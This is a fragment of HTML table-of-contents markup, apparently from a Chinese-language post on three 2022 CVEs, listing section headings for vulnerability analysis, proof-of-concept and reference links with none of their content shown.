CVE-2022-37057</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-1-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">4.3.1.</span> <span class="toc-text">4.3.1 漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-2-POC"><span class="toc-number">4.3.2.</span> <span class="toc-text">4.3.2 POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-4-CVE-2022-37056"><span class="toc-number">4.4.</span> <span class="toc-text">4.4 CVE-2022-37056</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4-1-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">4.4.1.</span> <span class="toc-text">4.4.1 漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4-2-POC"><span class="toc-number">4.4.2.</span> <span class="toc-text">4.4.2 POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-5-CVE-2022-36523"><span class="toc-number">4.5.</span> <span class="toc-text">4.5 CVE-2022-36523</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5-1-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">4.5.1.</span> <span class="toc-text">4.5.1 漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5-2-POC"><span class="toc-number">4.5.2.</span> <span class="toc-text">4.5.2 POC</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">5.</span> <span class="toc-text">5. 参考链接</span></a></li></ol>
                     </div>
                 </span>
             </div>
